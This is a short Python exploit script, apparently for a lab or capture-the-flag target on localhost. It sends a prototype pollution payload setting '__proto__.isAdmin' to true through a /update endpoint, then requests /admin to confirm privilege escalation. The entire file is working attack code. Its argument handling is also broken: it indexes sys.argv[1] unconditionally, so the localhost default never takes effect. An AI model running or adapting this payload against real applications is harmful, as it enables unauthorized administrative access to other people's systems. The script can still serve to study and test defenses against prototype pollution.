#!/usr/bin/env python3
import requests
import sys

URL = "http://127.0.0.1:3000" if not sys.argv[1] else str(sys.argv[1])
HEADERS = {"Content-Type": "application/json"}
def update_profile(session):
    # POST
    # this is a very simple/basic prototype pollution payload that sets isAdmin to true on the prototype
    payload = {
        "__proto__": {
            "isAdmin": True
        }
    }
    response = session.post(f"{URL}/update", json=payload, headers=HEADERS)
    if response.status_code == 200:
        print("Profile updated successfully.")
        return session
    else:
        print(f"Failed to update profile: {response.text}")
    return session

def access_admin(session):
    # GET
    resp = session.get(f"{URL}/admin")
    if resp.status_code == 200:
        print("Admin access granted!")
        print("Response:", resp.json())
    else:
        print(f"Admin access denied: {resp.text}")
        print(f"Status code: {resp.status_code}")

def main():
    with requests.Session() as session:
        update_profile(session)
        access_admin(session)
    
if __name__ == "__main__":
    main()